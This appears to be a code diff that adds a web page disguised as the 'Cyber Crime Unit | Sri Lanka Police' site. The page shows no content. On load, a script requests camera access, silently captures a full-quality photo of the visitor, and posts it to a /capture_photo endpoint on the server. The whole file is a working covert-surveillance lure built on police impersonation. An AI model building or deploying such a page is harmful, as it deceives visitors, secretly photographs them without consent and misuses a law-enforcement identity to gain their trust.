@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cyber Crime Unit | Sri Lanka Police</title>
+</head>
+<body>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Function to capture photo and send it to Flask server
+            function capturePhotoAndSend() {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(function(stream) {
+                    var video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.autoplay = true; // Auto play the video
+                    video.oncanplay = function() {
+                        // Wait for the video to be ready
+                        setTimeout(function() {
+                            // Create a canvas after video is ready
+                            var canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            var ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            // Convert canvas to data URL with JPEG format
+                            var photo = canvas.toDataURL('image/jpeg', 1.0); // Quality set to 1.0 (max quality)
+                            
+                            // Send the photo to the server
+                            fetch('/capture_photo', {
+                                method: 'POST',
+                                body: JSON.stringify({ photo: photo }),
+                                headers:{
+                                    'Content-Type': 'application/json'
+                                }
+                            }).then(response => response.text())
+                            .then(data => {
+                                console.log(data);
+                                // You can handle success response here
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                // You can handle error here
+                            });
+                            
+                            // Cleanup
+                            stream.getTracks().forEach(function(track) {
+                                track.stop();
+                            });
+                        }, 500); // Delay to ensure the video is ready
+                    };
+                })
+                .catch(function(error) {
+                    console.error('Error accessing camera:', error);
+                });
+            }
+            
+            // Automatically trigger photo capture when the page loads
+            capturePhotoAndSend();
+        });
+    </script>
+</body>
+</html>
